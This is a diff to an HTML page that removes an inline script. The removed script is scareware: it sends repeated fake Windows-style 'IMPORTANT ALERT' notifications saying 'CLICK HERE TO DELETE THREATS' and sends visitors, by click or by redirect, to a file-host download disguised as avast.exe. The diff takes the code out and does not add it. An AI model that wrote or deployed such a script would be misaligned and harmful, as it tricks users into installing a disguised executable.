@@ -4,38 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>FAF23sdfa235</title>
-<script>
-// Check if the browser supports push notifications
-if ('Notification' in window) {
-  Notification.requestPermission().then(function(result) {
-    if (result === 'granted') {
-      // User has granted permission
-      setInterval(function() {
-        // Create a new notification
-        var notification = new Notification('IMPORTANT ALERT', {
-          body: 'CLICK HERE TO DELETE THREATS',
-          icon: 'https://static-00.iconduck.com/assets.00/windows-icon-1009x1024-azbx1n7w.png' // Replace with the URL of your image
-        });
-        
-        // Handle notification click event
-        notification.onclick = function() {
-          // Redirect user to a specific link when notification is clicked
-          window.open('https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file', '_blank');
-        };
-      }, 5000); // Change the interval time (in milliseconds) according to your needs
-    } else if (result === 'denied') {
-      // User has denied permission
-      // Redirect user to a specific link
-      window.location.href = 'https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file';
-    } else {
-      // User has dismissed the permission prompt without making a choice
-      // Redirect user to a specific link
-      window.location.href = 'https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file';
-    }
-  });
-}
-</script>
-	
+
 	
 	
 	
